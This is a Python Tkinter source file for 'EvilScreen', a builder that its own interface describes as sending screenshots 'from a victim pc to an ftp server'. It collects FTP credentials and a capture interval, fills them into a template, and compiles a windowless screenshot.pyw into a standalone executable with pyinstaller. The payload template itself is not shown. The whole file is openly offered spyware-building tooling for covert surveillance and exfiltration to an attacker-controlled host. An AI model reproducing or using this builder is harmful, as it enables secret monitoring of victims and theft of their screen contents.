from importlib.resources import path
from tkinter import *
from PIL import ImageTk, Image
from dataclasses import replace
import os
import sys
import subprocess
import time
from pathlib import Path

#créer la main fenêtre
window = Tk()

def filemodify():
    script_location = os.path.split(os.path.realpath(sys.argv[0]))[0] + "ok/file.txt"
    print(script_location)
    f1 = open(script_location, 'r')
    f2 = open('screenshot.pyw', 'w')
    
    for line in f1:
        line = line.replace('nameeftp', ftpserveur)
        line = line.replace('usernameftp', ftpusername)
        line = line.replace('passwordftp', ftppassword)
        line = line.replace('temps', timee)
        f2.write(line)
    
    f1.close()
    f2.close()
    CREATE_NO_WINDOW = 0x08000000
    subprocess.call(r"pyinstaller --onefile screenshot.pyw", creationflags=CREATE_NO_WINDOW)
    time.sleep(3)
    

    

def homeclearfirst():
    frame1.destroy()
    frame1.pack_forget()
    build.destroy()
    build.pack_forget()
    window.update()
    home()


def homeclear():
    frame1.destroy()
    frame1.pack_forget()
    build.destroy()
    build.pack_forget()
    build1.destroy()
    build1.pack_forget()
    frame3.destroy()
    frame3.pack_forget()
    window.update()
    home()

def plusclear():
    print("pd")


def builder():
    global frame1
    global build
    global serveurentry
    global usernameentry
    global passwordentry
    window.config(background='#310E35')
    window.title("Evilscreen - Builder")
    frame.destroy()
    frame.pack_forget()
    window.update()
    
    frame1 = Frame(window, bg="#310E35")
    build = Frame(window, bg="#310E35")

    #menu
    buttonhome = Button(frame1, text="Home", font=("Courrier, 15"), bg='white', fg="#A200FF", command=(homeclearfirst)   ).grid(padx=5, pady=10, row=0, column=0)
    label_title = Label(frame1, text="Builder EvilScreen", font=("Courrier", 20), bg='#310E35', fg="white").grid(padx=15, pady=10, row=0, column=1)
    buttonplus = Button(frame1, text="About", font=("Courrier, 15"), bg='white', fg="#A200FF", command=(plus)).grid(padx=5, pady=10, row=0, column=2)
    
    ftptitle = Label(build, text="Configuration Ftp :", font=("Courrier", 20), bg='#310E35', fg="white").grid(padx=15, pady=10, row=2)
    serveurlabel = Label(build, text="Serveur configuration :", font=("Courrier", 10), bg='#310E35', fg="white").grid(row=1, column=1, pady=10)
    serveurentry = Entry(build)
    serveurentry.grid(row=1, column=2, pady=5)
    usernamelabel = Label(build, text="Username :", font=("Courrier", 10), bg='#310E35', fg="white").grid(row=2, column=1, pady=10)
    usernameentry = Entry(build)
    usernameentry.grid(row=2, column=2, pady=5)
    passwordlabel = Label(build, text="Password :", font=("Courrier", 10), bg='#310E35', fg="white").grid(row=3, column=1, pady=10)
    passwordentry = Entry(build)
    passwordentry.grid(row=3, column=2, pady=5)
    pushbutton = Button(build, text="Confirm", command=(push)).grid(row=4, column=2)
    #label_title = Label(window, text="Builder EvilScreen", font=("Courrier", 20), bg='#310E35', fg="white").place(x=225, y=20)
    #boutonrefresh = Button(window, text="refresh", bg="white", command=(refresh))
    build.pack(expand=YES)
    frame1.pack()
    window.mainloop()


def push():
    global ftpserveur
    global ftpusername
    global ftppassword
    global frame3
    global build1
    global timeentry
    ftpserveur = serveurentry.get()
    ftpusername = usernameentry.get()
    ftppassword = passwordentry.get()
    if len(ftpserveur) == 0:
        return
    if len(ftpusername) == 0:
        return
    if len(ftppassword) == 0:
        return
    window.config(background='#310E35')
    window.title("Evilscreen - Builder")
    frame1.destroy()
    frame1.pack_forget()
    build.destroy()
    build.pack_forget()
    window.update()

    frame3 = Frame(window, bg="#310E35")
    build1 = Frame(window, bg="#310E35")

    timelabel = Label(build1, text="Temps entre chaque screenshot :", font=("Courrier", 10), bg='#310E35', fg="white").grid(row=2, column=1, pady=10)
    timeentry = Entry(build1)
    timeentry.grid(row=2, column=2, pady=5)
    pushbutton = Button(build1, text="Confirm", command=(finish)).grid(row=4, column=2)

    buttonhome = Button(frame3, text="Home", font=("Courrier, 15"), bg='white', fg="#A200FF", command=(homeclear)).grid(padx=5, pady=10, row=0, column=0)
    label_title = Label(frame3, text="Builder EvilScreen", font=("Courrier", 20), bg='#310E35', fg="white").grid(padx=15, pady=10, row=0, column=1)
    buttonplus = Button(frame3, text="About", font=("Courrier, 15"), bg='white', fg="#A200FF", command=(plus)).grid(padx=5, pady=10, row=0, column=2)



    build1.pack(expand=YES)
    frame3.pack()
    window.mainloop()

def finish():
    global timee
    timee = timeentry.get()
    window.config(background='#310E35')
    window.title("Evilscreen - Builder")
    frame3.destroy()
    frame3.pack_forget()
    build1.destroy()
    build1.pack_forget()
    window.update()

    frame4 = Frame(window, bg="#310E35")

    timelabel = Label(frame4, text="Le build est terminé ! :", font=("Courrier", 10), bg='#310E35', fg="white").grid(row=2, column=1, pady=10)

    filemodify()

    frame4.pack()
    window.mainloop()


def plus():
    window.config(background='#310E35')
    window.title("Evilscreen - About")
    frame.destroy()
    frame.pack_forget()
    frame1.destroy()
    frame1.pack_forget()
    build.destroy()
    build.pack_forget()
    window.update

    label_title = Label(window, text="About Evilscreen")
    

    window.mainloop()

def home():
    global frame
    #personnaliser cette fenêtre
    window.title("EvilScreen - Home")
    window.geometry("720x480")
    window.minsize(480, 360)
    window.maxsize(1920, 1080)
    window.iconbitmap(os.path.split(os.path.realpath(sys.argv[0]))[0] + "\ok\Evil-icon.ico")
    window.config(background='#310E35')
    
    #créer la frame
    frame = Frame(window, bg='#310E35')
    frame2 = Frame(frame, bg="#310E35")
    
    #ajouter un texte
    label_title = Label(frame, text="Builder EvilScreen", font=("Courrier", 20), bg='#310E35', fg="white")
    label_title.pack(expand=YES)
    label_subtitle = Label(frame, text="A simple builder that allows you to send automaticly screenshots from a victim pc to an ftp server.", font=("Courrier", 10), bg='#310E35', fg="white")
    label_subtitle.pack(expand=YES)
    label_test = Label(frame2, text="       ", fg="#310E35", bg="#310E35").grid(row=0, column=1)
    
    #ajouter un bouton
    bouton = Button(frame2, text="Builder", font=("Courrier", 15), bg='white', fg="#A200FF", command=(builder)).grid(row=1, column=0)
    
    about = Button(frame2, text="About", font=("Courrier", 15), bg='white', fg="#A200FF", command=(plus)).grid(row=1, column=2)
    
    #ajouter frame
    frame.pack(expand=YES)
    frame2.pack(expand=YES)
    #afficher
    window.mainloop()

home()